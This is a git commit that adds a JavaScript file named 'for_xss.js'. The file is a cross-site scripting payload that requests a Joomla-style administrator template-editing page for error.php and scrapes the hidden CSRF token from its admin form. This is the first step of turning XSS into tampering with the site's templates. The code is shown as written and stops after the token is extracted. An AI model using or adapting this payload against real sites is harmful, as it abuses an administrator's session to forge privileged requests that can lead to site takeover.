14de4ba90506c2298c76c027ae8c3eaeedb6890e
Lam Nguyen <60765640+kiven7299@users.noreply.github.com>
2020-06-03 10:28:43 +0700

    Create for_xss.js

---
+++ JS/for_xss.js
@@ -0,0 +1,17 @@
+/* 
+Get csrf token
+*/
+var xhttp = new XMLHttpRequest();
+var response1 = "";
+xhttp.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		response1 = this.responseText;
+	}
+};
+xhttp.open("GET", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", false); //asynchronous false: need to get whole response text for next step
+xhttp.send();
+var parser = new DOMParser();
+var xmlDoc = parser.parseFromString(response1, 'text/html'); //Firefox: text/html, Chrome: text/xml
+var token = xmlDoc.querySelector('#adminForm > input[type=hidden]:nth-child(3)').name;
+
+
